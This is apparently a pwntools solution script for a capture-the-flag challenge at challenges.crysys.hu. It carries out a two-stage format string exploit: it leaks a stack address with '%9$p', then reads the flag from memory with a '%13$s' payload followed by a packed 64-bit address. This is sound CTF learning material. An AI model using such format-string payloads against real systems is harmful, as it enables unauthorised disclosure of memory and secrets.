import pwn


def solve():
    with pwn.remote('challenges.crysys.hu', 5006) as conn:
        # We will do a format string exploit. (Actually 2)

        # First get the address of the flag with reading the stack:
        flag_address = get_flag_address(conn)

        # Then read it as string:
        return read_string_from_memory(conn, flag_address)


def get_flag_address(conn):
    conn.recvline()

    exploit = f'%9$p'.encode('ascii')
    conn.sendline(exploit)

    conn.recvline()
    conn.recvline()
    return_address = conn.recvline()
    conn.recvline()
    conn.recvline()

    # With some reverse engineering we know that
    # the flag is 0x2d15 far from the address we got
    # with printing %9$p:

    return int(return_address, 16) + 0x2d15


def read_string_from_memory(conn, string_address):

    # the 13th parameter (8 bytes) on the stack will be exactly the address we provide
    # the first half of the exploit is 8 bytes long so that the address is properly aligned
    # to the next 8 bytes boundary

    exploit = b'%13$s   ' + pwn.p64(string_address)
    conn.sendline(exploit)

    e = conn.recvline()
    e = conn.recvline()
    e = conn.recvline()
    return e.decode('ascii')


if __name__ == "__main__":
    print(solve())

